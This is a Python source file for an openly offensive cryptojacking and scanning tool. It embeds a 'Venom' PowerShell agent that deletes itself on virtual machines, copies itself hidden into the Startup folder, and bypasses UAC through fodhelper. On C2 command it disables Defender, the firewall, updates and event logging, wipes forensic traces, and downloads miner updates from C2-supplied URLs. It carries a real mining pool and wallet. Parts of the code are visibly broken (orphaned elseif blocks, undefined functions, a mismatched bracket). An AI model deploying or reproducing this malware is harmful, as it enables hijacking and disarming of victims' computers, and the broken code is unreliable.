import asyncio
import aiohttp
import socket
import time
import json
import base64
import uuid
import urllib.parse
import platform
import subprocess
import random
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from rich.text import Text 
from fake_useragent import UserAgent
import ipaddress
import re
import os
import argparse
import traceback
import http.server 
import threading 
import socketserver 
import smtplib 
import webbrowser 
import getpass 
import shutil 
import glob 
import sys 

# Try to import scapy for network manipulation, but make it optional
try:
    import scapy.all as scapy
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

# Import IPP server components
try:
    from ippserver.server import IPPServer, IPPRequestHandler as BaseIPPRequestHandler
    from ippserver.behaviour import StatelessPrinter
    from ippserver.constants import OperationEnum, SectionEnum, TagEnum
    from ippserver.parsers import Integer, Enum, Boolean
    HAS_IPP_SERVER = True
except ImportError:
    HAS_IPP_SERVER = False

# Dummy imports/definitions for cryptography and other external utilities
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    HAS_CRYPTOGRAPHY = True
except ImportError:
    HAS_CRYPTOGRAPHY = False
    print("Warning: 'cryptography' module not found. Encryption features will be disabled.")

try:
    from PIL import Image 
except ImportError:
    Image = None
    print("Warning: 'Pillow' (PIL) module not found. Steganography features will be disabled.")

try:
    from stegano import lsb 
except ImportError:
    lsb = None
    print("Warning: 'stegano' module not found. Steganography features will be disabled.")

# Dummy for figlet_format if pyfiglet is not available
try:
    from pyfiglet import figlet_format
except ImportError:
    def figlet_format(text, font):
        return f"#### {text} ####"

# Dummy for alive_bar if not installed
try:
    from alive_progress import alive_bar
except ImportError:
    class alive_bar:
        def __init__(self, total, title):
            print(f"Starting: {title}...")
        def __enter__(self):
            return self
        def __exit__(self, exc_type, exc_val, exc_tb):
            print("Done.")
        def __call__(self):
            pass 

console = Console()

# Configuration
CONFIG = {
    "WEB_SCAN_TIMEOUT": 15,
    "ATTACKER_IP": "127.0.0.1", 
    "ATTACKER_PORT": 9000,      
    "CONCURRENT_CONNECTIONS": 500,
    "BATCH_SIZE": 1000,
    "TARGET_PORTS": [25, 80, 443, 445, 631, 7001, 7002, 8009, 8080, 8443, 10443],
    "EXCLUDED_PIDS": [0, 4],
    "PROTECTED_PROCESSES": ["svchost.exe", "lsass.exe", "wininit.exe", "csrss.exe", "smss.exe", "services.exe", "winlogon.exe", "System", "System Idle Process", "Registry"],
    "HTTP_PORT": 8080,
    "IPP_PORT": 631,
    "ENABLE_IPV6": False,
    # Miner specific config (used by in_memory_mining and local HTTP server)
    "MINER_POOL_URL": "wss://gulf.moneroocean.stream:10128", 
    "MINER_WALLET_ADDRESS": "8C35Eesbr8T2CP6RpgLVC82JnUSgcEEse34PqEzzFad6UJLNJkKtaLcW7pBXJQJsjXPLdqLqxGXSX6eFBTZwWVtb5HtM28K", 
    "SCAN_SIZE": 3000000, 
}

# Global File Paths
IP_LOG_FILE = "vulnerable_ips.txt"
EXPLOITED_FILE = "exploited.txt"
CHECKPOINT_FILE = "scan_checkpoint.txt"
CRASH_LOG_FILE = "crash_log.txt"

# --- EMBEDDED VENOM POWERSHELL AGENT CODE ---
VENOM_POWERSHELL_AGENT_SCRIPT = r"""
#>

# Ignore errors
$ErrorActionPreference = "SilentlyContinue"

# Get the full path and content of the currently running script
$ScriptPath = $MyInvocation.MyCommand.Path
$ExePath = (Get-Process -Id $PID).Path
$FullPath = if ($ScriptPath) { $ScriptPath } else { $ExePath }

# These functions will identify which virtual environment the script is running in.
function Test-ProcessExists {
    param (
        [string[]]$Processes
    )
    foreach ($proc in $Processes) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
            return $true
        }
    }
    return $false
}

function Test-ServiceExists {
    param (
        [string[]]$Services
    )
    foreach ($service in $Services) {
        if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
            return $true
        }
    }
    return # True if any key exists, False otherwise.
}

function Test-RegistryKeyExists {
    param (
        [string[]]$Keys
    )
    foreach ($key in $Keys) {
        if (Test-Path "Registry::$key") {
            return $true
        }
    }
    return # True if any key exists, False otherwise.
}

function Test-RegistryValueMatch {
    param (
        [string]$Key,
        [string]$ValueName,
        [string]$Pattern
    )
    try {
        $value = Get-ItemProperty -Path "Registry::$Key" -Name $ValueName -ErrorAction Stop
        if ($value.$ValueName -match $Pattern) {
            return $true
        }
    } catch {
        return $false
    }
    return $false
}

function Get-RegistryValueString {
    param (
        [string]$Key,
        [string]$ValueName
    )
    try {
        $value = Get-ItemProperty -Path "Registry::$Key" -Name $ValueName -ErrorAction Stop
        return $value.$ValueName
    } catch {
        return $null
    }
}

function Test-Parallels {
    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    $videoBiosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
    if ($biosVersion -match "parallels" -or $videoBiosVersion -match "parallels") {
        return $true
    }
    return $false
}

function Test-HyperV {
    $physicalHost = Get-RegistryValueString -Key "HKLM\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters" -ValueName "PhysicalHostNameFullyQualified"
    if ($physicalHost) {
        Write-Host "This is a Hyper-V Virtual Machine running on physical host $physicalHost"
        return $true
    }

    $sfmsvals = Get-ChildItem "Registry::HKLM\SOFTWARE\Microsoft" -Name
    if ($sfmsvals -contains "Hyper-V" -or $sfmsvals -contains "VirtualMachine") {
        return $true
    }

    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    if ($biosVersion -match "vrtual" -or $biosVersion -eq "Hyper-V") {
        return $true
    }

    $keys = @("HKLM:\SOFTWARE\Microsoft\Hyper-V") # This was a placeholder, adding a concrete example
    if (Test-RegistryKeyExists -Keys $keys) {
        return $true
    }

    $hypervServices = @("vmicexchange")
    if (Test-ServiceExists -Services $hypervServices) {
        return $true
    }

    return $false
}

function Test-VMware {
    $vmwareServices = @("vmdebug", "vmmouse", "VMTools", "VMMEMCTL", "tpautoconnsvc", "tpvcgateway", "vmware", "wmci", "vmx86")

    if (Test-ServiceExists -Services $vmwareServices) {
        return $true
    }

    $systemManufacturer = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemManufacturer"
    if ($systemManufacturer -match "vmware") {
        return $true
    }

    $scsiPort1 = Get-RegistryValueString -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 1\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier"
    if ($scsiPort1 -match "vmware") {
        return $true
    }

    if (Test-RegistryValueMatch -Key "HKLM\SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000" -ValueName "DriverDesc" -Pattern "cl_vmx_svga|VMWare") {
        return $true
    }

    $vmwareProcs = @("vmtoolsd", "vmwareservice", "vmwaretray", "vmwareuser")

    if (Test-ProcessExists -Processes $vmwareProcs) {
        return $true
    }

    return $false
}

function Test-VirtualBox {
    $vboxProcs = @("vboxservice", "vboxtray")
    $vboxServices = @("VBoxMouse", "VBoxGuest", "VBoxService", "VBoxSF", "VBoxVideo")

    if (Test-ServiceExists -Services $vboxServices -or Test-ProcessExists -Processes $vboxProcs) {
        return $true
    }

    $keys = @("HKLM\HARDWARE\ACPI\DSDT\VBOX__")
    if (Test-RegistryKeyExists -Keys $keys) {
        return $true
    }

    for ($i = 0; $i -le 2; $i++) {
        if (Test-RegistryValueMatch -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port $i\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier" -Pattern "vbox") {
            return $true
        }
    }

    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    $videoBiosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
    if ($biosVersion -match "vbox" -or $videoBiosVersion -match "virtualbox") {
        return $true
    }

    $systemProductName = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemProductName"
    if ($systemProductName -match "virtualbox") {
        return $true
    }

    return $false
}

function Test-Xen {
    $xenProcs = @("xenservice")
    $xenServices = @("xenevtchn", "xennet", "xennet6", "xensvc", "xenvdb")

    if (Test-ProcessExists -Processes $xenProcs -or Test-ServiceExists -Services $xenServices) {
        return $true
    }

    $keys = @("HKLM\HARDWARE\ACPI\DSDT\Xen")
    if (Test-RegistryKeyExists -Keys $keys) {
        return $true
    }

    $systemProductName = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemProductName"
    if ($systemProductName -match "xen") {
        return $true
    }

    return $false
}

function Test-QEMU {
    $biosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "SystemBiosVersion"
    $videoBiosVersion = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System" -ValueName "VideoBiosVersion"
    if ($biosVersion -match "qemu" -or $videoBiosVersion -match "qemu") {
        return $true
    }

    $scsiPort0 = Get-RegistryValueString -Key "HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0" -ValueName "Identifier"
    $systemManufacturer = Get-RegistryValueString -Key "HKLM\HARDWARE\DESCRIPTION\System\BIOS" -ValueName "SystemManufacturer"
    if ($scsiPort0 -match "qemu|virtio" -or $systemManufacturer -match "qemu") {
        return $true
    }

    if (Test-RegistryValueMatch -Key "HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0" -ValueName "ProcessorNameString" -Pattern "qemu") {
        return $true
    }

    $keys = @("HKLM\HARDWARE\ACPI\DSDT\BOCHS_")
    if (Test-RegistryKeyExists -Keys $keys) {
        return $true
    }

    return $false
}

# Function to detect if script is running in a virtual environment
function Invoke-DetectVirtualMachine {
    if (Test-Parallels) {
        return $false
    } elseif (Test-HyperV) {
        return $false
    } elseif (Test-VMware) {
        return $false
    } elseif (Test-VirtualBox) {
        return $false
    } elseif (Test-Xen) {
        return $false
    } elseif (Test-QEMU) {
        return $false
    } else {
        return $true # If not detected as VM, assume it's physical (or unknown VM)
    }
}

# If script is running in a virtual environment delete itself.
If (-not (Invoke-DetectVirtualMachine)) { # This means it IS a VM, so delete.
    if ($ScriptPath) {
        Remove-Item -Path $FullPath -Force
    } else {
        Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Remove-Item -Path '$FullPath' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
    }
}

# Define the startup path for replicating
$startupPath = Join-Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Startup\'

# Function to check if the script is running as admin
function Test-Admin {
    return (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Function to replicate the script to the startup folder
function Invoke-SelfReplication {
    param(
        [string]$SourcePath,
        [string]$DestinationDir # New parameter for destination directory
    )
    $replicatedFileName = [System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($SourcePath)
    $replicatedFullPath = [System.IO.Path]::Combine($DestinationDir, $replicatedFileName)

    # Only replicate if the source file exists and is not already in the destination with the same content
    if (Test-Path $SourcePath) {
        # Simplification: Always copy with a new random name for persistence strategy as per original logic.
        Set-Content -Path $replicatedFullPath -Value (Get-Content -Path $SourcePath -Raw)
        (Get-Item $replicatedFullPath).Attributes = 'Hidden'
        Write-Host "Replicated '$SourcePath' to '$replicatedFullPath' and set to hidden."
        return $replicatedFullPath
    }
    return $null
}

# Function to leave no traces
function Invoke-SelfDestruction {
    # Remove registry keys related to ms-settings
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings\shell" -Recurse -Force

    # Delete prefetch files related to this script
    Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "*POWERSHELL*.pf" | Remove-Item -Force
    $scriptName = [System.IO.Path]::GetFileNameWithoutExtension($FullPath)
    $prefetchFiles = Get-ChildItem -Path "$env:SystemRoot\Prefetch" -Filter "$scriptName*.pf"
    if ($prefetchFiles) {
        foreach ($file in $prefetchFiles) {
            Remove-Item -Path $file.FullName -Force
        }
    }

    # Delete all the shortcut (.lnk) files that have been accessed or modified within the last day
    $recentFiles = Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Recent" | Where-Object { $_.LastWriteTime -ge ((Get-Date).AddDays(-1)) }
    if ($recentFiles) {
        foreach ($file in $recentFiles) {
            Remove-Item -Path $file.FullName -Recurse -Force
        }
    }

    # Delete itself if the script isn't in startup;
    # if it is, then rename it with a random name every execution to reduce the risk of detection
    if (-not (Test-Path ($startupPath + [System.IO.Path]::GetFileName($FullPath)))) {
        if ($ScriptPath) {
            Remove-Item -Path $FullPath -Force
        } else {
            Start-Process powershell.exe -ArgumentList "-NoProfile -Command `"Remove-Item -Path '$FullPath' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
        }
    } else {
        Rename-Item $FullPath -NewName ([System.IO.Path]::GetRandomFileName() + [System.IO.Path]::GetExtension($FullPath)) -Force
    }
}

# Function to set registry properties
function Set-RegistryProperties {
    param (
        [string]$path,
        [hashtable]$properties
    )

    if (-not (Test-Path $path)) {
        New-Item -Path $path -Force | Out-Null
    }

    foreach ($key in $properties.Keys) {
        Set-ItemProperty -Path $path -Name $key -Value $properties[$key] -Type DWord -Force
    }
}

# --- Combined C2 Communication with PowerShell's Stealth Egress: UAC bypass logic --- 
# UAC bypass from PowerShell script 
if (-not (Test-Admin)) {
    $value = "`"powershell.exe`" -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$FullPath`""
    # Check whether the script runs as a powershell script (.ps1) or an executable (.exe) file
    if ($MyInvocation.MyCommand.CommandType -ne 'ExternalScript') {
        $value = "`"$FullPath`""
    }

    # If not running as admin, set reg keys to execute the script with bypassing User Account Control (UAC) 
    New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value $value -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType String -Force | Out-Null

    # Trigger the UAC prompt by running fodhelper 
    Start-Process "fodhelper.exe" -WindowStyle Hidden

    # UAC bypassed here!
    # Exit the script to allow the rest run as admin
    exit
}

# If running as admin, perform the registry modifications

# Define the reg paths
$baseKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$realTimeProtectionKey = "$baseKey\Real-Time Protection"
$firewallPath = "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy"

# --- Optimized Mining Resource Allocation with System Modifications: New 'optimize_environment' task --- 
# All security-disabling registry modifications are now part of this task.
# These will only be applied when commanded by the C2.
elseif ($dtask.StartsWith("optimize_environment")) {
    Write-Host "Optimizing environment for mining by disabling security features."

    # First, Disable Windows Recovery Environment (WinRE)
    reagentc /disable

    # Second, disable security notifications shown by Windows
    Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" -properties @{"Enabled" = 0}
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -properties @{"DisableNotifications" = 1}

    # Disable Windows Defender features
    Set-RegistryProperties -path $baseKey -properties @{
        "DisableAntiSpyware" = 1 # Main disabling
        "DisableApplicationGuard" = 1
        "DisableControlledFolderAccess" = 1
        "DisableCredentialGuard" = 1
        "DisableIntrusionPreventionSystem" = 1
        "DisableIOAVProtection" = 1
        "DisableRealtimeMonitoring" = 1
        "DisableRoutinelyTakingAction" = 1
        "DisableSpecialRunningModes" = 1
        "DisableTamperProtection" = 1
        "PUAProtection" = 0
        "ServiceKeepAlive" = 0
    }

    Set-RegistryProperties -path $realTimeProtectionKey -properties @{
        "DisableBehaviorMonitoring" = 1
        "DisableBlockAtFirstSeen" = 1
        "DisableCloudProtection" = 1
        "DisableOnAccessProtection" = 1
        "DisableScanOnRealtimeEnable" = 1
        "DisableScriptScanning" = 1
        "SubmitSamplesConsent" = 2
        "DisableNetworkProtection" = 1
    }

    # Disable Windows Firewall
    Set-RegistryProperties -path "$firewallPath\DomainProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}
    Set-RegistryProperties -path "$firewallPath\StandardProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}
    Set-RegistryProperties -path "$firewallPath\PublicProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}

    # Disable Windows Defender SmartScreen
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -Force
    Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Edge\SmartScreenEnabled" -properties @{"(Default)" = 0}
    Set-RegistryProperties -path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" -properties @{"EnableWebContentEvaluation" = 0}

    # Disable Automatic Updates
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -properties @{"NoAutoUpdate" = 1}
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\wuauserv" -properties @{"Start" = 4}

    # Disable System Restore
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" -properties @{"DisableSR" = 1; "DisableConfig" = 1}
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\srservice" -properties @{"Start" = 4}

    # Disable Task Manager
    Set-RegistryProperties -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"DisableTaskMgr" = 1}

    # Disable Command Prompt
    Set-RegistryProperties -path "HKCU:\Software\Policies\Microsoft\Windows\System" -properties @{"DisableCMD" = 1}

    # Disable Remote Desktop Connections
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -properties @{"fDenyTSConnections" = 1}

    # Disable User Account Control (UAC)
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -properties @{"EnableLUA" = 0}

    # Disable Windows Security Center
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -properties @{"Start" = 4}

    # Disable Error Reporting to Microsoft
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting" -properties @{"Disabled" = 1}

    # Disable Remote Assistance Connections
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -properties @{"fAllowToGetHelp" = 0}

    # Disable the service responsible for troubleshooting Windows Update
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc" -properties @{"Start" = 4}

    # Disable Background Intelligent Transfer Service (BITS), used by Windows Update and other applications for file transfers
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\BITS" -properties @{"Start" = 4}

    # Disable Windows Script Host, preventing scripts from running
    Set-RegistryProperties -path "HKLM:\Software\Microsoft\Windows Script Host\Settings" -properties @{"Enabled" = 0}

    # Disable Windows Event Logging
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog" -properties @{"Start" = 4}

    # Disable Windows Defender Services
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -properties @{"Start" = 4}

    # Disable Windows Search Service
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -properties @{"Start" = 4}

    # Disable Windows Automatic Maintenance
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" -properties @{"MaintenanceDisabled" = 1}

    # Disable Windows Defender Credential Guard
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -properties @{"LsaCfgFlags" = 0}
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -properties @{"LsaCfgFlags" = 0}

    # Disable Device Guard
    Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -properties @{"EnableVirtualizationBasedSecurity" = 0; "RequirePlatformSecurityFeatures" = 0; "HVCIMATRequired" = 0}

    # Disable Application Guard
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Microsoft\Hvsi" -properties @{"Enabled" = 0}

    # Disable Windows Defender Exploit Guard
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard" -properties @{"EnableExploitProtection" = 0}

    # Disable Telemetry and Data Collection
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DataCollection" -properties @{"AllowTelemetry" = 0}

    # Disable OneDrive
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\OneDrive" -properties @{"DisableFileSyncNGSC" = 1}

    # Disable Cortana
    Set-RegistryProperties -path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Windows Search" -properties @{"AllowCortana" = 0}
    $res = "Environment optimized for mining."
}
# --- End of 'optimize_environment' task ---

# --- Combined C2 Communication with PowerShell's Stealth Egress: Store C2 config in registry --- 
# Store C2 config in registry
New-Item -Path "HKCU:\Software\Venom\$id" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Venom\$id" -Name "C2_IP" -Value $ip -Force
Set-ItemProperty -Path "HKCU:\Software\Venom\$id" -Name "C2_Port" -Value $port -Force

# --- Enhance Persistence: Call Invoke-SelfReplication during initialization --- 
Invoke-SelfReplication -SourcePath $FullPath -DestinationDir $startupPath

# --- Enhance Persistence: Call Invoke-SelfDestruction conditionally in loop --- 
if (-not (Test-PoolConnectivity)) { Invoke-SelfDestruction }

# --- Function definitions for miner encryption (added for 'Encrypt Miner Communications') ---
function Encrypt-InMemoryString($stringToEncrypt, $xorKey) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($stringToEncrypt)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($xorKey)
    $encryptedBytes = New-Object byte[] $bytes.Length
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $encryptedBytes[$i] = $bytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return [System.Convert]::ToBase64String($encryptedBytes)
}

function Decrypt-InMemoryString($encryptedString, $xorKey) {
    $bytes = [System.Convert]::FromBase64String($encryptedString)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($xorKey)
    $decryptedBytes = New-Object byte[] $bytes.Length
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $decryptedBytes[$i] = $bytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}

# --- Modified Start-Mining function to use encryption (for 'Encrypt Miner Communications') ---
function Start-Mining {
    param ($MinerJsPath, $Intensity)
    # These values are substituted by the Python script from CONFIG
    $poolUrl = "MINER_POOL_URL_PLACEHOLDER"
    $walletAddress = "MINER_WALLET_ADDRESS_PLACEHOLDER"
    
    $encrypted_pool = Encrypt-InMemoryString $poolUrl $InMemoryXorKey
    $encrypted_wallet = Encrypt-InMemoryString $walletAddress $InMemoryXorKey

    $decrypted_pool = Decrypt-InMemoryString $encrypted_pool $InMemoryXorKey
    $decrypted_wallet = Decrypt-InMemoryString $encrypted_wallet $InMemoryXorKey

    Write-Host "Connecting to pool: $decrypted_pool with wallet: $decrypted_wallet"
    
    # Placeholder for actual mining logic using $decrypted_pool and $decrypted_wallet
    # For a real scenario, you'd execute node.exe with arguments for the miner.js,
    # ensuring the miner.js itself correctly uses these decrypted values.
    # For now, it will just log that it's "mining".
    $res = "Mining simulated with encrypted pool: $decrypted_pool and wallet: $decrypted_wallet"
    return $res
}

# --- New 'update_miner' task (for 'Automate Miner Updates via C2') --- 
elseif ($dtask.StartsWith("update_miner|")) {
    $parts = $dtask.Split("|")
    $miner_url = $parts[1]
    $miner_path = "$env:TEMP\miner_new.js"
    Invoke-WebRequestWithPinning -Uri $miner_url -OutFile $miner_path
    # Use Invoke-SelfReplication logic to hide and persist
    # Note: Invoke-SelfReplication now takes SourcePath and DestinationDir
    $replicated = Invoke-SelfReplication -SourcePath $miner_path -DestinationDir $startupPath
    if ($replicated) {
        $res = "Miner updated and persisted to $replicated."
    } else {
        $res = "Failed to update miner."
    }
} elseif ($dtask.StartsWith("bios_persistence")) { # New command to trigger BIOS persistence
    # This is a placeholder. A real implementation would involve complex PowerShell
    # to interact with BIOS/UEFI firmware, potentially using external tools like UEFITool.
    # It would be highly system-dependent and risky.
    $res = "Attempting BIOS persistence... (Note: Actual BIOS modification is highly complex and risky.)"
}
"""

# --- EMBEDDED OLD MINER.JS (for Spectral Recon option) ---
EMBEDDED_MINER_JS = """
// This is a dummy or actual old miner.js logic.
const os = {}; 
const fs = {}; 
const cp = {}; 
const axios = {}; 
const WebSocket = window.WebSocket; 

// Dummy config for the embedded miner, won't conflict with Venom's C2
let POOL_URL = 'wss://dummy-pool.example.com:443';
let WALLET_ADDRESS = 'YOUR_DUMMY_WALLET_ADDRESS';
let LOG_URL = 'http://127.0.0.1:9000/dummy_log'; 
const WORKER_ID = `WASMWorker-` + Math.random().toString(36).slice(2);
let THREADS = 1; 

function START_MINING() {
    try {
        const ws = new WebSocket(POOL_URL);
        ws.onopen = () => {
            console.log('Dummy Miner Connected');
        };
        ws.onmessage = (event) => {
            const job = JSON.parse(event.data);
            if (job.type === 'job') {
                setTimeout(() => {
                    try {
                        ws.send(JSON.stringify({
                            type: 'submit',
                            params: { job_id: job.job_id, nonce: Math.random().toString(36).slice(2), result: 'dummy_hash' }
                        }));
                    } catch(e) {}
                }, 2000);
            }
        };
        ws.onerror = (e) => console.error('Dummy Miner WS Error:', e);
        ws.onclose = () => setTimeout(START_MINING, 5000);
    } catch(e) {}
}

const WASM_BLOB_BASE64 = "AGFzbQEAAAABBgFgAX8BfwMCAQAHBAVzdGFydAABAAp2BAEAcwAQbGltaXRzGICAgAAgAAtstachpPgtcgMAAAsLc3RhY2tQb2lnt`erAwALC3N0YWNrX3B0cgMAAAoLCW1lbW9yeSAQACAAIQAgACEDASABIAJBAEoNAAsLCw==";
const wasm_bin = atob(WASM_BLOB_BASE64);
const wasm_bytes = new Uint8Array(wasm_bin.length);
for (let i = 0; i < wasm_bin.length; i++) { wasm_bytes[i] = wasm_bin.charCodeAt(i); }

async function run_wasm_miner() {
    try {
        const wasm_module = await WebAssembly.compile(wasm_bytes);
        const instance = await WebAssembly.instantiate(wasm_module);
        console.log('WASM Miner Instance Created for ' + WALLET_ADDRESS);
        setInterval(() => {
            try { instance.exports.start(); } catch (e) {}
        }, 1000);
    } catch (e) {
        console.error("WASM failed to load:", e);
    }
}

if (typeof window !== 'undefined') {
    run_wasm_miner();
    START_MINING(); 
} else {
    console.log("Running in Node.js environment. WASM/Browser-based mining skipped.");
}
"""

# Global Configuration & File Paths
BACKUP_DIR = os.path.join(os.getenv('APPDATA') if platform.system() == 'Windows' else '/tmp', '.mining_backups')
os.makedirs(BACKUP_DIR, exist_ok=True)

RESERVED_RANGES = [
    ipaddress.ip_network('0.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('100.64.0.0/10'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.0.0.0/24'),
    ipaddress.ip_network('192.0.2.0/24'),
    ipaddress.ip_network('192.88.99.0/24'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('198.18.0.0/15'),
    ipaddress.ip_network('198.51.100.0/24'),
    ipaddress.ip_network('203.0.113.0/24'),
    ipaddress.ip_network('224.0.0.0/4'),
    ipaddress.ip_network('240.0.0.0/4'),
    ipaddress.ip_network('255.255.255.255/32')
]

COUNTRY_IP_RANGES = {
    'Andorra': [('2.16.14.0', '2.16.14.255'), ('46.252.32.0', '46.252.63.255'), ('77.65.192.0', '77.65.223.255')],
    'United Arab Emirates': [('2.16.15.0', '2.16.15.255'), ('5.32.0.0', '5.35.255.255'), ('5.46.160.0', '5.46.191.255')],
    'Afghanistan': [('5.39.0.0', '5.39.63.255'), ('37.111.128.0', '37.111.191.255'), ('43.250.24.0', '43.250.27.255')],
    'Antigua and Barbuda': [('65.111.160.0', '65.111.191.255'), ('69.31.128.0', '69.31.159.255')],
    'Anguilla': [('65.111.128.0', '65.111.159.255'), ('69.31.96.0', '69.31.127.255')],
    'Albania': [('2.16.4.0', '2.16.5.255'), ('31.44.64.0', '31.44.127.255'), ('31.171.128.0', '31.171.159.255')],
    'Armenia': [('2.16.6.0', '2.16.7.255'), ('5.34.192.0', '5.34.223.255'), ('5.58.32.0', '5.58.47.255')],
    'Viet Nam': [('1.52.0.0', '1.55.255.255'), ('27.64.0.0', '27.79.255.255'), ('42.112.0.0', '42.119.255.255')],
    'Zimbabwe': [('2.16.83.0', '2.16.83.255'), ('5.103.160.0', '5.103.191.255'), ('41.56.0.0', '41.63.255.255')]
]

# Key derivation function for password-based encryption
def derive_miner_key(passphrase):
    if not HAS_CRYPTOGRAPHY:
        console.print("[red]Cryptography module not available. Cannot derive miner key.[/red]")
        return None
